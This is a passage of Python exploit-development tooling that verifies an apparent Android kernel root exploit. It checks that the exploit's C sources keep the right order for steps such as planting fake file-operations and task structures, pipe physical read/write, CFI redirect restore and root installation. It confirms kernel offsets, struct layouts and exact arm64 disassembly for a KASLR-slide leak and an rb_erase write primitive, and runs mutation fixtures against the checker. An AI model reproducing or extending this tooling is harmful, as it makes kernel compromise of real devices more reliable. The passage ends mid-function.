                    f"dirty supervisor retention logs before blocking/ignoring {signal}"
                )
        sigpipe_dirty = dirty_branch.find("SIGPIPE")
        if first_dirty_log < 0 or sigpipe_dirty < 0 or sigpipe_dirty > first_dirty_log:
            errors.append("dirty supervisor retention logging does not block/ignore SIGPIPE first")
        if "for (;;)" not in dirty_branch or "waitpid(child, &status, WNOHANG)" not in dirty_branch:
            errors.append("dirty supervisor retention branch does not park/reap nonfatally")
    waitpid_error_blocks = [
        block
        for block in c_if_blocks(preload_supervise, r"waited\s*<\s*0")
        if "waitpid attempt" in block
    ]
    if len(waitpid_error_blocks) != 1:
        errors.append("preload has no unique non-EINTR waitpid error block")
    else:
        waitpid_block = waitpid_error_blocks[0]
        retain_pos = waitpid_block.find("retain_current_boot_dirty_child")
        pr_error_pos = waitpid_block.find("pr_error(")
        dirty_pos = source_find_any(
            waitpid_block,
            (
                "atomic_load(&payload_state->dirty)",
                "atomic_load_explicit(&payload_state->dirty, memory_order_acquire)",
                "payload_primitive_is_dirty()",
            ),
        )
        if (
            pr_error_pos >= 0
            and (dirty_pos < 0 or dirty_pos > pr_error_pos or retain_pos < 0 or retain_pos > pr_error_pos)
        ):
            errors.append("preload non-EINTR waitpid error can pr_error before dirty retention")
        if pr_error_pos >= 0:
            errors.append("preload non-EINTR waitpid error uses pr_error after possible dirty state")
    if "kill(child, SIGKILL)" in preload or "SYSCHK(kill(child, SIGKILL))" in preload:
        errors.append("dirty supervisor timeout can SIGKILL a possibly PI-stale attempt")
    write_readback = c_function_body(root, "root_a2_write_readback")
    ordered_source_contract(
        write_readback,
        ["pipe_phys_write_data(", "root_a2_read(", "memcmp("],
        "root_a2 write/readback primitive",
        errors,
    )

    install = c_function_body(fops, "install_child_root")
    ordered_source_contract(
        install,
        [
            "install_pipe_physrw(fd)",
            "cleanup_main_waiter_pi_state(fd)",
            "install_android_root(fd)",
        ],
        "pipe/waiter-cleanup/A3 ordering",
        errors,
    )
    ordered_source_contract(
        stage,
        [
            "install_child_root(fd)",
            "restore_cfi_redirect_exact(fd, misc_fops, original_fops)",
            "root_a3_commit_helper()",
        ],
        "cleanup/global-fops/A3-final ordering",
        errors,
    )
    ordered_source_contract(
        stage,
        [
            "repair_fake_fops_llseek(fd)",
            "configfs_read_once(fd, binwrite_target",
            "configfs_read_once(fd, misc_fops",
        ],
        "llseek repair/readback/use ordering",
        errors,
    )
    return errors


def run_pad3_mode4_source_negative_fixtures(
    sources: dict[str, str], route: object
) -> int:
    if pad3_mode4_source_contract_errors(sources, route):
        raise RuntimeError("positive Pad 3 mode4 C source contract was rejected")

    mutations: dict[str, tuple[str, str, str]] = {
        "old-generic-owner-clobber": (
            "util",
            "fake_parent = fake_fops; fake_right = misc_fops; fake_left = 0;",
            "fake_parent = pselect_custom_target - 8; fake_right = fake_fops; fake_left = 0;",
        ),
        "cached-root-leftmost-w0": (
            "util",
            "put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);",
            "put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF); put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);",
        ),
        "pipe-prepare-request-unserved": (
            "main",
            "atomic_exchange(&pipe_prepare_request, 0)",
            "atomic_load(&pipe_prepare_request)",
        ),
        "fake-stack-donor": (
            "fops",
            '{12, text_addr(INIT_TASK), "task"}',
            '{12, fake_task, "task"}',
        ),
        "donor-pi-top-mismatch": (
            "util",
            "uint64_t pi_top_task = text_addr(INIT_TASK)",
            "uint64_t pi_top_task = fake_task",
        ),
        "runtime-shift-override": (
            "fops",
            "return PSELECT_WAITER_WORD_SHIFT",
            'return env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14)',
        ),
        "runtime-simple-layout-override": (
            "fops",
            "static int pselect_simple_layout(void) { return 0; }",
            'static int pselect_simple_layout(void) { return env_flag("PSELECT_SIMPLE_LAYOUT", 0); }',
        ),
        "custom-route-zero-enter-delay": (
            "fops",
            "pselect_custom_write_enabled() ? PSELECT_ENTER_DELAY_USEC : -1",
            "pselect_custom_write_enabled() ? 0 : -1",
        ),
        "missing-early-chain-unlock": (
            "main",
            "futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0)",
            "(void)f_pi_chain",
        ),
        "missing-consumer-inflight-wait": (
            "fops",
            "while (atomic_load(&consumer_inflight) && inflight_wait_ms < 3000)",
            "if (atomic_load(&consumer_inflight) && inflight_wait_ms < 3000)",
        ),
        "mode4-blind-success": (
            "fops",
            "if (custom_mode == 4)",
            "if (custom_mode)",
        ),
        "mode4-success-counter-gate": (
            "fops",
            "int route_signal = custom_mode == 4 ? calls > 0 : calls > 0 && success > 0",
            "int route_signal = calls > 0 && success > 0",
        ),
        "consumer-ack-omitted": (
            "main",
            "atomic_store_explicit(&consumer_quiesced_seq, seq, memory_order_release)",
            "/* consumer quiesced ack omitted */",
        ),
        "producer-ack-not-acquire": (
            "fops",
            "atomic_load_explicit(&consumer_quiesced_seq, memory_order_acquire)",
            "atomic_load(&consumer_quiesced_seq)",
        ),
        "mode4-required-after-go": (
            "fops",
            "atomic_store(&pi_cleanup_required, 1)",
            "/* pi cleanup required omitted before go */",
        ),
        "mode4-seq-after-go": (
            "fops",
            "atomic_store(&pi_cleanup_seq, route_attempt)",
            "/* pi cleanup seq omitted before go */",
        ),
        "missing-cleanup-before-a3": (
            "fops",
            "cleanup_main_waiter_pi_state(fd)",
            "cleanup_main_waiter_pi_state_after_a3(fd)",
        ),
        "cleanup-no-route-done-gate": (
            "root",
            "atomic_load(&route_done) != 0",
            "0",
        ),
        "cleanup-no-required-gate": (
            "root",
            "atomic_load(&pi_cleanup_required) != 1",
            "0",
        ),
        "cleanup-no-seq-match-gate": (
            "root",
            "atomic_load(&pi_cleanup_seq) != atomic_load_explicit(&consumer_quiesced_seq, memory_order_acquire)",
            "0",
        ),
        "snapshot-retry-attempts-weakened": (
            "root_raw",
            "#define ROOT_A2_SNAPSHOT_RETRY_ATTEMPTS 4",
            "#define ROOT_A2_SNAPSHOT_RETRY_ATTEMPTS 5",
        ),
        "snapshot-retry-deadline-weakened": (
            "root_raw",
            "#define ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS 500",
            "#define ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS 5000",
        ),
        "snapshot-retry-pipe-dirty-ignored": (
            "root",
            "|| pipe_restore_unknown || !ROOT_A2_RETRY_GATE_STABLE()) { break; }",
            "|| pipe_restore_known || ROOT_A2_RETRY_GATE_STABLE()) { break; }",
        ),
        "snapshot-retry-writes-before-cleanup": (
            "root",
            "root_a2_snapshot_current(fd, snapshot)",
            "root_a2_write_readback(fd, 0, 0, 0) || root_a2_snapshot_current(fd, snapshot)",
        ),
        "a3-direct-snapshot-no-retry": (
            "root",
            "root_a2_snapshot_current_retry(fd, &parent)",
            "root_a2_snapshot_current(fd, &parent)",
        ),
        "waiter-fail-stop-omitted": (
            "main",
            "pi_cleanup_fail_stop(-1)",
            "pi_cleanup_return_stop(-1)",
        ),
        "try-cfi-fail-stop-drops-fd": (
            "fops",
            "pi_cleanup_fail_stop(fd)",
            "pi_cleanup_fail_stop(-1)",
        ),
        "fail-stop-returning": (
            "root_raw",
            "__attribute__((noreturn))",
            "",
        ),
        "cleanup-no-stable-snapshot": (
            "root",
            "memcmp(&first, &second, sizeof(first)) != 0",
            "memcmp(&first, &second, sizeof(first)) == 0",
        ),
        "cleanup-no-pi-lock-zero": (
            "root",
            "first.pi_lock != 0",
            "first.pi_lock == 0",
        ),
        "cleanup-no-pi-root-zero": (
            "root",
            "first.pi_root != 0",
            "first.pi_root == 0",
        ),
        "cleanup-no-pi-leftmost-zero": (
            "root",
            "first.pi_leftmost != 0",
            "first.pi_leftmost == 0",
        ),
        "cleanup-no-pi-top-zero": (
            "root",
            "first.pi_top != 0",
            "first.pi_top == 0",
        ),
        "cleanup-no-blocked-alignment": (
            "root",
            "(first.blocked_on & 7) != 0",
            "(first.blocked_on & 7) == 0",
        ),
        "cleanup-no-blocked-kernel-pointer-gate": (
            "root",
            "!is_kernel_ptr((uintptr_t)first.blocked_on)",
            "is_kernel_ptr((uintptr_t)first.blocked_on)",
        ),
        "cleanup-no-stack-window": (
            "root",
            "first.stack + TASK_THREAD_SIZE - RT_MUTEX_WAITER_SIZE",
            "first.stack + TASK_THREAD_SIZE + RT_MUTEX_WAITER_SIZE",
        ),
        "cleanup-writes-wrong-field": (
            "root",
            "blocked_addr = current.task + FAKE_TASK_PI_BLOCKED_ON_OFF",
            "blocked_addr = current.task + FAKE_TASK_PI_TOP_TASK_OFF",
        ),
        "cleanup-no-zero-readback": (
            "root",
            "after.blocked_on != 0",
            "after.blocked_on == 0",
        ),
        "dirty-supervisor-timeout-sigkill": (
            "preload",
            "dirty supervisor timeout no SIGKILL",
            "dirty supervisor timeout no SIGKILL; kill(child, SIGKILL)",
        ),
        "util-open-ashmem-syschk": (
            "util",
            "return open(ashmem_path, O_RDWR | O_CLOEXEC);",
            "return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));",
        ),
        "util-sched-setattr-syschk": (
            "util",
            "long ret = syscall(274, tid, &attr, 0);",
            "long ret = SYSCHK(syscall(274, tid, &attr, 0));",
        ),
        "publish-nonleader-allowed": (
            "preload",
            "if (process_id != thread_id) { errno = EPERM; return 0; }",
            "if (0 && process_id != thread_id) { errno = EPERM; return 0; }",
        ),
        "publish-pdeath-clear-removed": (
            "preload",
            "if (prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0) != 0) { return 0; }",
            "if (0) { return 0; }",
        ),
        "supervisor-sigpipe-block-removed": (
            "preload",
            "sigaddset(&blocked_signals, SIGPIPE);",
            "/* sigpipe block removed */",
        ),
        "dirty-timeout-kills-after-snapshot": (
            "preload",
            'dprintf(STDERR_FILENO, "[-] CURRENT_BOOT_DIRTY_RETAIN timeout child=%d dirty=1\\n", child); retain_current_boot_dirty_child(child, 0);',
            'dprintf(STDERR_FILENO, "[-] CURRENT_BOOT_DIRTY_RETAIN timeout child=%d dirty=1\\n", child); kill(child, SIGKILL);',
        ),
    }
    for name, (source_name, old, new) in mutations.items():
        fixture = copy.deepcopy(sources)
        text = normalized_source(fixture[source_name])
        if old not in text:
            raise RuntimeError(
                f"cannot construct Pad 3 mode4 source fixture {name}: {old!r}"
            )
        fixture[source_name] = text.replace(old, new, 1)
        if not pad3_mode4_source_contract_errors(fixture, route):
            raise RuntimeError(f"negative Pad 3 mode4 source fixture passed: {name}")
    dynamic_mutation_count = 0
    dynamic_mutations: list[tuple[str, str, tuple[str, ...], str]] = [
        (
            "fail-stop-pr-error-substitution",
            "root",
            (
                "dprintf(STDERR_FILENO,",
                "write(STDERR_FILENO,",
                "write(2,",
                "syscall(SYS_write, STDERR_FILENO",
            ),
            "pr_error(",
        ),
        (
            "dirty-retention-pr-error-substitution",
            "preload",
            (
                'pr_warning("current-boot dirty supervisor timeout no SIGKILL',
                'dprintf(STDERR_FILENO, "[-] current-boot dirty supervisor timeout no SIGKILL',
                'dprintf(STDERR_FILENO, "current-boot dirty supervisor timeout no SIGKILL',
                'write(STDERR_FILENO, "current-boot dirty supervisor timeout no SIGKILL',
            ),
            'pr_error("current-boot dirty supervisor timeout no SIGKILL',
        ),
        (
            "redirect-fail-goto-close",
            "fops",
            (
                "if (!restore_cfi_redirect_exact(fd, misc_fops, original_fops)) { pi_cleanup_fail_stop(fd); }",
                "if (!restore_cfi_redirect_exact(fd, misc_fops, original_fops)) { cfi_last_step = 5; cfi_last_errno = errno; pi_cleanup_fail_stop(fd); }",
                "pi_cleanup_fail_stop(fd);",
            ),
            "goto close_unknown;",
        ),
        (
            "commit-negative-return",
            "fops",
            (
                "if (commit_result < 0)",
                "if (commit_result < 0) { pi_cleanup_fail_stop(fd); }",
                "if (commit_result < 0) { cfi_outcome = CFI_OUTCOME_DIRTY_UNKNOWN; pi_cleanup_fail_stop(fd); }",
            ),
            "if (commit_result < 0) { return 0; } if (0)",
        ),
        (
            "snapshot-post-deadline-removal",
            "root",
            (
                "post_call_ms - started_ms <= ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
                "post_call_ms - started_ms > ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
                "now_ms - started_ms <= ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
                "now_ms - started_ms > ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
                "completed_ms - started_ms <= ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
                "completed_ms - started_ms > ROOT_A2_SNAPSHOT_RETRY_DEADLINE_MS",
            ),
            "1",
        ),
        (
            "pipe-checked-op-syschk",
            "pipe",
            (
                "if (pipe(result_pipe) != 0)",
                "if (fcntl(",
                "if (socketpair(",
                "if (sendmsg(",
                "if (write(",
                "if (read(",
                "if (close(",
                "if (fork(",
                "if (waitpid(",
            ),
            "SYSCHK(pipe(result_pipe))",
        ),
        (
            "pipe-nonfatal-log-pr-error-substitution",
            "pipe",
            (
                "dprintf(STDERR_FILENO,",
                "fprintf(stderr,",
            ),
            "pr_error(",
        ),
        (
            "post-required-closure-pr-error-substitution",
            "fops",
            (
                'pr_warning("kernel physical live validation failed',
                'pr_warning("kernel physical load validation failed',
            ),
            'pr_error("kernel physical live validation failed',
        ),
    ]
    for name, source_name, olds, new in dynamic_mutations:
        fixture = copy.deepcopy(sources)
        text = normalized_source(fixture[source_name])
        old = next((candidate for candidate in olds if candidate in text), None)
        if old is None:
            raise RuntimeError(
                f"cannot construct Pad 3 mode4 source fixture {name}: "
                + " or ".join(repr(candidate) for candidate in olds)
            )
        fixture[source_name] = text.replace(old, new, 1)
        if not pad3_mode4_source_contract_errors(fixture, route):
            raise RuntimeError(f"negative Pad 3 mode4 source fixture passed: {name}")
        dynamic_mutation_count += 1

    move_pdeath_fixture = copy.deepcopy(sources)
    move_pdeath_text = normalized_source(move_pdeath_fixture["preload"])
    pdeath_guard = "if (prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0) != 0) { return 0; }"
    marker_publish = "atomic_store(&primitive_marker_ready, 1);"
    if pdeath_guard not in move_pdeath_text or marker_publish not in move_pdeath_text:
        raise RuntimeError("cannot construct Pad 3 mode4 source fixture publish-pdeath-clear-after-marker")
    move_pdeath_text = move_pdeath_text.replace(
        pdeath_guard, "/* PDEATHSIG clear moved after marker publish */", 1
    )
    move_pdeath_text = move_pdeath_text.replace(
        marker_publish, marker_publish + " " + pdeath_guard, 1
    )
    move_pdeath_fixture["preload"] = move_pdeath_text
    if not pad3_mode4_source_contract_errors(move_pdeath_fixture, route):
        raise RuntimeError(
            "negative Pad 3 mode4 source fixture passed: publish-pdeath-clear-after-marker"
        )
    dynamic_mutation_count += 1
    if not isinstance(route, dict):
        raise RuntimeError("cannot construct mode4 profile fixture")
    profile_fixture = copy.deepcopy(route)
    profile_fixture["runtime_layout_override"] = True
    if not pad3_mode4_source_contract_errors(sources, profile_fixture):
        raise RuntimeError("negative Pad 3 mode4 profile fixture passed: runtime-layout")
    return len(mutations) + dynamic_mutation_count + 1


def verify_pad3_uuid_slide(
    *,
    profile: dict[str, object],
    defines: dict[str, int],
    symbols: dict[str, int],
    kallsyms_symbols: dict[str, int],
    structs: dict[str, list[tuple[int, dict[str, int]]]],
    enums: dict[str, list[dict[str, int]]],
    image: bytes,
    base: int,
    vmlinux: Path,
    objdump: str,
    clang: str,
    failures: list[str],
) -> None:
    route = profile.get("slide_route")
    if not isinstance(route, dict):
        failures.append("profile has no Pad 3 slide_route")
        return

    def expect_profile_int(key: str, expected: int) -> None:
        try:
            actual = profile_int(route, key)
        except (KeyError, ValueError):
            failures.append(f"slide_route.{key} is not a valid integer")
            return
        if actual != expected:
            failures.append(
                f"slide_route.{key}=0x{actual:x}, extracted=0x{expected:x}"
            )

    ctl_size, ctl = choose_struct(
        structs,
        "ctl_table",
        {"procname", "data", "maxlen", "mode", "proc_handler"},
    )
    nf_size, nf = choose_struct(
        structs, "nf_logger", {"name", "type", "logfn", "me"}
    )
    nf_types = choose_enum(
        enums,
        "nf_log_type",
        {"NF_LOG_TYPE_LOG", "NF_LOG_TYPE_ULOG", "NF_LOG_TYPE_MAX"},
    )
    expected_ctl = {
        "ctl_table_size": ctl_size,
        "ctl_table_procname_offset": ctl["procname"],
        "ctl_table_data_offset": ctl["data"],
        "ctl_table_maxlen_offset": ctl["maxlen"],
        "ctl_table_mode_offset": ctl["mode"],
        "ctl_table_handler_offset": ctl["proc_handler"],
        "nf_logger_size": nf_size,
        "nf_logger_name_field_offset": nf["name"],
        "nf_logger_type_field_offset": nf["type"],
        "nf_logger_logfn_field_offset": nf["logfn"],
        "nf_logger_me_field_offset": nf["me"],
    }
    for key, expected in expected_ctl.items():
        expect_profile_int(key, expected)
    if ctl_size != 0x40 or ctl["data"] != 0x8:
        failures.append("exact BTF ctl_table is not size 0x40/data +0x8")
    if (nf_size, nf["name"], nf["type"], nf["logfn"], nf["me"]) != (
        0x20,
        0,
        8,
        0x10,
        0x18,
    ):
        failures.append("exact BTF nf_logger layout changed")
    if nf_types != {
        "NF_LOG_TYPE_LOG": 0,
        "NF_LOG_TYPE_ULOG": 1,
        "NF_LOG_TYPE_MAX": 2,
    }:
        failures.append(f"exact BTF nf_log_type values changed: {nf_types!r}")

    required_symbols = {
        "random_table",
        "proc_do_uuid",
        "nfulnl_logger",
        "nfulnl_log_packet",
        "rb_erase",
        "rb_erase_cached",
        "rb_next",
        "rt_mutex_setprio",
    }
    missing = sorted(required_symbols - symbols.keys())
    if missing:
        failures.append("missing exact slide symbols: " + ", ".join(missing))
        return
    for symbol in sorted(required_symbols | {"_text"}):
        if kallsyms_symbols.get(symbol) != symbols.get(symbol):
            failures.append(
                f"exact kallsyms/vmlinux mismatch for {symbol}: "
                f"kallsyms={kallsyms_symbols.get(symbol)!r} "
                f"vmlinux={symbols.get(symbol)!r}"
            )
    random_rva = symbols["random_table"] - base
    proc_uuid_rva = symbols["proc_do_uuid"] - base
    nfulnl_rva = symbols["nfulnl_logger"] - base
    logfn_rva = symbols["nfulnl_log_packet"] - base
    rb_erase_rva = symbols["rb_erase"] - base
    rb_erase_cached_rva = symbols["rb_erase_cached"] - base
    rt_mutex_setprio_rva = symbols["rt_mutex_setprio"] - base

    boot_index = 4
    uuid_index = 5
    terminator_index = 6
    boot_entry = random_rva + boot_index * ctl_size
    uuid_entry = random_rva + uuid_index * ctl_size
    boot_slot = boot_entry + ctl["data"]
    uuid_slot = uuid_entry + ctl["data"]
    boot_name_ptr = image_u64(image, boot_entry + ctl["procname"], "boot_id.procname")
    uuid_name_ptr = image_u64(image, uuid_entry + ctl["procname"], "uuid.procname")
    boot_data = image_u64(image, boot_slot, "boot_id.data")
    uuid_data = image_u64(image, uuid_slot, "uuid.data")
    boot_handler = image_u64(
        image, boot_entry + ctl["proc_handler"], "boot_id.proc_handler"
    )
    uuid_handler = image_u64(
        image, uuid_entry + ctl["proc_handler"], "uuid.proc_handler"
    )
    boot_name_rva = boot_name_ptr - base
    uuid_name_rva = uuid_name_ptr - base
    boot_name = image_cstring(image, boot_name_rva, "boot_id.procname")
    uuid_name = image_cstring(image, uuid_name_rva, "uuid.procname")
    terminator = image[
        random_rva + terminator_index * ctl_size :
        random_rva + (terminator_index + 1) * ctl_size
    ]
    if boot_name != "boot_id" or uuid_name != "uuid":
        failures.append(
            f"random_table names changed: index4={boot_name!r} index5={uuid_name!r}"
        )
    if uuid_data != 0:
        failures.append(f"random_table[5].data is not initially NULL: {uuid_data:#x}")
    if boot_data != symbols.get("sysctl_bootid") or boot_slot == uuid_slot:
        failures.append(
            "boot_id slot is not the distinct exact sysctl_bootid pointer slot"
        )
    if boot_handler != base + proc_uuid_rva or uuid_handler != boot_handler:
        failures.append("boot_id/uuid entries do not both use exact proc_do_uuid")
    if terminator != bytes(ctl_size):
        failures.append("random_table[6] is not the exact zero terminator")

    table_profile = {
        "random_table_offset": random_rva,
        "random_table_entry_count": 7,
        "boot_id_entry_index": boot_index,
        "boot_id_procname_rva": boot_name_rva,
        "boot_id_data_slot_offset": boot_slot,
        "boot_id_data_initial": boot_data,
        "uuid_entry_index": uuid_index,
        "uuid_procname_rva": uuid_name_rva,
        "uuid_data_slot_offset": uuid_slot,
        "uuid_data_initial": uuid_data,
        "random_table_terminator_index": terminator_index,
        "proc_do_uuid_offset": proc_uuid_rva,
        "proc_do_uuid_nonzero_guard_offset": 8,
    }
    for key, expected in table_profile.items():
        expect_profile_int(key, expected)

    name_pointer = image_u64(image, nfulnl_rva + nf["name"], "nfulnl.name")
    type_qword_rva = nfulnl_rva + nf["type"]
    type_qword = image_u64(image, type_qword_rva, "nfulnl.type qword")
    type_value = image_u32(image, type_qword_rva, "nfulnl.type")
    type_padding = image_u32(image, type_qword_rva + 4, "nfulnl.type padding")
    logfn_pointer = image_u64(image, nfulnl_rva + nf["logfn"], "nfulnl.logfn")
    module_pointer = image_u64(image, nfulnl_rva + nf["me"], "nfulnl.me")
    name_rva = name_pointer - base
    if image_cstring(image, name_rva, "nfulnl.name string") != "nfnetlink_log":
        failures.append("nfulnl_logger.name is not exact string nfnetlink_log")
    if type_value != nf_types["NF_LOG_TYPE_ULOG"] or type_padding != 0:
        failures.append(
            f"nfulnl type/padding is not ULOG/zero: {type_value:#x}/{type_padding:#x}"
        )
    if type_qword != 1:
        failures.append(f"nfulnl type qword is not exactly 1: {type_qword:#x}")
    if logfn_pointer != base + logfn_rva:
        failures.append("nfulnl.logfn does not point at exact nfulnl_log_packet")
    if module_pointer != 0:
        failures.append(f"nfulnl.me is not NULL: {module_pointer:#x}")

    nfulnl_profile = {
        "nfulnl_logger_offset": nfulnl_rva,
        "nfulnl_name_rva": name_rva,
        "nfulnl_type_qword_offset": type_qword_rva,
        "nfulnl_type_qword_initial": type_qword,
        "nfulnl_logfn_offset": logfn_rva,
        "rb_erase_offset": rb_erase_rva,
        "rb_collateral_offset_from_parent": 8,
    }
    for key, expected in nfulnl_profile.items():
        expect_profile_int(key, expected)

    expected_macros = {
        "SLIDE_USE_RANDOM_UUID_LEAK": 1,
        "SLIDE_RANDOM_UUID_DATA_OFF": uuid_slot,
        "SLIDE_NFULNL_LOGGER_NAME_OFF": name_rva,
        "SLIDE_NFULNL_LOGGER_TYPE_QWORD_OFF": type_qword_rva,
        "SLIDE_NFULNL_LOGGER_TYPE_QWORD_ORIGINAL": type_qword,
        "SLIDE_NFULNL_LOGGER_LOGFN_OFF": logfn_rva,
    }
    for macro, expected in expected_macros.items():
        if defines.get(macro) != expected:
            failures.append(
                f"{macro}: header=0x{defines.get(macro, -1):x} extracted=0x{expected:x}"
            )

    p0_page = defines.get("P0_PAGE_OFFSET", -1)
    p0_phys = defines.get("P0_PHYS_OFFSET", -1)
    p0_load = defines.get("P0_KERNEL_PHYS_LOAD", -1)
    phys_delta = p0_load - p0_phys
    nfulnl_alias = p0_page | (nfulnl_rva + phys_delta)
    type_alias = p0_page | (type_qword_rva + phys_delta)
    uuid_slot_alias = p0_page | (uuid_slot + phys_delta)
    boot_slot_alias = p0_page | (boot_slot + phys_delta)
    logfn_field_alias = p0_page | (nfulnl_rva + nf["logfn"] + phys_delta)
    alias_profile = {
        "p0_page_offset": p0_page,
        "p0_phys_offset": p0_phys,
        "p0_kernel_phys_load": p0_load,
        "p0_kernel_phys_delta": phys_delta,
        "nfulnl_direct_map_alias": nfulnl_alias,
        "nfulnl_type_qword_direct_map_alias": type_alias,
        "nfulnl_logfn_field_direct_map_alias": logfn_field_alias,
        "uuid_data_direct_map_alias": uuid_slot_alias,
        "expected_qword1": uuid_slot_alias,
    }
    for key, expected in alias_profile.items():
        expect_profile_int(key, expected)
    if not defines.get("DIRECT_MAP_BASE", 0) <= uuid_slot_alias < defines.get(
        "DIRECT_MAP_END", 0
    ):
        failures.append("derived UUID data alias is outside the direct map")
    physical = profile["physical_layout"]
    if not isinstance(physical, dict):
        failures.append("physical_layout is not an object")
    else:
        if phys_delta != profile_int(physical, "kernel_phys_load") - profile_int(
            physical, "phys_offset"
        ):
            failures.append("P0 alias delta does not match exact XBL physical layout")

    proc_dis = disassembly(vmlinux, objdump, "proc_do_uuid")
    ordered_disassembly_contract(
        proc_dis,
        [
            "ldr x22, [x0, #0x8]",
            "cbz x22",
            "ldrb w8, [x22, #0x8]",
            "cbnz w8",
            "mov x0, x22",
            "bl 0xffffffc0807070a8 <generate_random_uuid>",
            "mov x3, x22",
            "bl 0xffffffc081048b50 <snprintf>",
        ],
        "proc_do_uuid exact data/nonzero/format route",
        failures,
    )
    rb_dis = disassembly(vmlinux, objdump, "rb_erase")
    rb_instructions = parse_disassembly_instructions(rb_dis)
    rb_expected = {
        0x00: "ldp x8, x10, [x0, #0x8]",
        0x04: f"cbz x10, 0x{rb_erase_rva + base + 0x50:x}",
        0x08: f"cbz x8, 0x{rb_erase_rva + base + 0x84:x}",
        0x84: "ldr x9, [x0]",
        0x88: "ands x8, x9, #0xfffffffffffffffc",
        0x8C: "str x9, [x10]",
        0x90: f"b.eq 0x{rb_erase_rva + base + 0x2ac:x}",
        0x94: "ldr x9, [x8, #0x10]!",
        0x98: "sub x11, x8, #0x8",
        0x9C: "cmp x9, x0",
        0xA0: "csel x1, x8, x11, eq",
        0xA4: "str x10, [x1]",
        0xA8: "ret",
    }
    rb_contract_failures: list[str] = []
    rb_base = base + rb_erase_rva
    exact_offset_disassembly_contract(
        rb_instructions,
        rb_base,
        rb_expected,
        "rb_erase one-left-child exact basic block",
        rb_contract_failures,
    )
    failures.extend(rb_contract_failures)
    if not rb_contract_failures:
        for fixture_name, fixture_offset, replacement in (
            ("missing-collateral-store", 0xA4, "nop"),
            (
                "wrong-left-child-branch-target",
                0x08,
                f"cbz x8, 0x{rb_base + 0x50:x}",
            ),
        ):
            mutated = dict(rb_instructions)
            mutated[rb_base + fixture_offset] = replacement
            fixture_failures: list[str] = []
            exact_offset_disassembly_contract(
                mutated,
                rb_base,
                rb_expected,
                f"rb_erase negative fixture {fixture_name}",
                fixture_failures,
            )
            if not fixture_failures:
                failures.append(
                    f"rb_erase negative fixture escaped: {fixture_name}"
                )

    rb_right_expected = {
        0x00: "ldp x8, x10, [x0, #0x8]",
        0x04: f"cbz x10, 0x{rb_base + 0x50:x}",
        0x50: "ldr x9, [x0]",
        0x54: "mov x11, x1",
        0x58: "ands x10, x9, #0xfffffffffffffffc",
        0x5C: f"b.eq 0x{rb_base + 0x74:x}",
        0x60: "mov x11, x10",
        0x64: "ldr x12, [x11, #0x10]!",
        0x68: "sub x13, x11, #0x8",
        0x6C: "cmp x12, x0",
        0x70: "csel x11, x11, x13, eq",
        0x74: "str x8, [x11]",
        0x78: f"cbz x8, 0x{rb_base + 0x224:x}",
        0x7C: "str x9, [x8]",
        0x80: "ret",
    }
    rb_right_failures: list[str] = []
    exact_offset_disassembly_contract(
        rb_instructions,
        rb_base,
        rb_right_expected,
        "rb_erase one-right-child owner-safe exact basic block",
        rb_right_failures,
    )
    failures.extend(rb_right_failures)
    if not rb_right_failures:
        mutated = dict(rb_instructions)
        mutated[rb_base + 0x7C] = "nop"
        fixture_failures: list[str] = []
        exact_offset_disassembly_contract(
            mutated,
            rb_base,
            rb_right_expected,
            "rb_erase right-child negative fixture",
            fixture_failures,
        )
        if not fixture_failures:
            failures.append("rb_erase right-child child-parent store fixture escaped")

    cached_base = base + rb_erase_cached_rva
    cached_dis = disassembly(vmlinux, objdump, "rb_erase_cached")
    cached_instructions = parse_disassembly_instructions(cached_dis)
    cached_expected = {
        0x10: "ldr x8, [x1, #0x8]",
        0x1C: "cmp x8, x0",
        0x20: f"b.ne 0x{cached_base + 0x30:x}",
        0x24: "mov x0, x20",
        0x28: f"bl 0x{symbols['rb_next']:x}",
        0x2C: "str x0, [x19, #0x8]",
        0x30: "mov x0, x20",
        0x34: "mov x1, x19",
        0x38: f"bl 0x{rb_base:x}",
    }
    exact_offset_disassembly_contract(
        cached_instructions,
        cached_base,
        cached_expected,
        "rb_erase_cached exact leftmost/rb_next gate",
        failures,
    )

    setprio_base = base + rt_mutex_setprio_rva
    setprio_dis = disassembly(vmlinux, objdump, "rt_mutex_setprio")
    setprio_instructions = parse_disassembly_instructions(setprio_dis)
    setprio_expected = {
        0x40: "ldr w24, [x19, #0x8c]",
        0x48: "ldr w8, [x21, #0x84]",
        0x58: "ldr w8, [sp, #0x4]",
        0x5C: f"cbnz w8, 0x{setprio_base + 0x6c:x}",
        0x60: "ldr x8, [x19, #0x930]",
        0x64: "cmp x8, x21",
        0x68: f"b.eq 0x{setprio_base + 0x1a0:x}",
        0x1A0: f"tbnz w24, #0x1f, 0x{setprio_base + 0x6c:x}",
        0x1A4: "ldr w8, [x19, #0x84]",
        0x1A8: "cmp w24, w8",
        0x1AC: f"b.eq 0x{setprio_base + 0x46c:x}",
        0x4A0: "ret",
    }
    setprio_failures: list[str] = []
    exact_offset_disassembly_contract(
        setprio_instructions,
        setprio_base,
        setprio_expected,
        "rt_mutex_setprio donor/pi_top/prio early-return path",
        setprio_failures,
    )
    failures.extend(setprio_failures)
    if not setprio_failures:
        mutated = dict(setprio_instructions)
        mutated[setprio_base + 0x68] = f"b.ne 0x{setprio_base + 0x1a0:x}"
        fixture_failures = []
        exact_offset_disassembly_contract(
            mutated,
            setprio_base,
            setprio_expected,
            "rt_mutex_setprio negative donor fixture",
            fixture_failures,
        )
        if not fixture_failures:
